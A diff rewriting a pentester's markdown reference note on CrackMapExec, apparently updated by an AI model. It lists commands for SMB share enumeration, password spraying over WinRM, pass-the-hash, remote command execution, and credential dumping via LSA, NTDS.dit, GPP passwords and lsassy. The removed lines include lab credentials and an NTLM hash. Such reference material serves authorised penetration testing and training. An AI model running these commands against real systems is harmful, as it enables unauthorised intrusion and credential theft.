@@ -1,13 +1,70 @@
-#crackmapexec
+# CrackMapExec (CME)
 
-#update
+**Tags:** `#crackmapexec` `#cme` `#smb` `#lateral` `#enumeration` `#postexploitation`
 
-- Swiss army tool
-- [GitHub - byt3bl33d3r/CrackMapExec: A swiss army knife for pentesting networks](https://github.com/byt3bl33d3r/CrackMapExec)
-- `crackmapexec smb 10.129.14.128 --shares -u '' -p ''` enumerate smb shares
-- `crackmapexec winrm 10.129.42.197 -u user.list -p password.list` cracks winrm passwords
-- `crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares` list SMB shares
-- `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa` drumping LSA secrets using stolen creds
-- `crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds` grabbing NTDS.dit file from ADDC (must be an admin account)
-- `crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami` command execution
-- `crackmapexec smb 172.16.1.0/24 -u '' -p ''` scan entire subnet for smb shares
+> [!note] **CrackMapExec is superseded by NetExec** — CME is no longer maintained. NetExec (`netexec` / `nxc`) is the actively maintained fork with identical syntax. Prefer NetExec for all new work. CME commands are listed here for reference — swap `crackmapexec` for `netexec` and they work identically.
+
+See [[NetExec]] for the full reference. This note covers CME-specific syntax for backward compatibility.
+
+---
+
+## Common CME Commands
+
+```bash
+# Null session share enum
+crackmapexec smb 192.168.1.10 --shares -u '' -p ''
+
+# Authenticated share enum
+crackmapexec smb 192.168.1.10 -u user -p Password --shares
+
+# Subnet scan
+crackmapexec smb 192.168.1.0/24 -u '' -p ''
+
+# Credential validation
+crackmapexec smb 192.168.1.10 -u Administrator -p Password
+crackmapexec smb 192.168.1.0/24 -u Administrator -p Password
+
+# Pass the Hash
+crackmapexec smb 192.168.1.10 -u Administrator -H :NTLMhash
+crackmapexec smb 192.168.1.10 -u Administrator -d . -H NTLMhash  # local auth
+
+# Command execution
+crackmapexec smb 192.168.1.10 -u Administrator -p Password -x "whoami"
+crackmapexec smb 192.168.1.10 -u Administrator -H NTLMhash -x "whoami"
+
+# Local auth
+crackmapexec smb 192.168.1.10 -u Administrator -p Password --local-auth
+
+# WinRM
+crackmapexec winrm 192.168.1.10 -u user -p Password
+crackmapexec winrm 192.168.1.0/24 -u user.list -p password.list
+
+# Credential dump — LSA
+crackmapexec smb 192.168.1.10 -u Administrator -p Password --lsa --local-auth
+
+# Credential dump — NTDS
+crackmapexec smb dc01 -u Administrator -p Password --ntds
+
+# Module — GPP passwords
+crackmapexec smb dc01 -u user -p Password -M gpp_password
+
+# Module — lsassy
+crackmapexec smb 192.168.1.10 -u Administrator -p Password -M lsassy
+```
+
+---
+
+## Migration to NetExec
+
+```bash
+# CME → NetExec — just swap the command
+crackmapexec smb ...  →  netexec smb ...
+crackmapexec winrm ... →  netexec winrm ...
+# All flags and modules are identical
+```
+
+---
+
+*Created: 2026-03-06*
+*Updated: 2026-03-06*
+*Model: claude-sonnet-4-6*
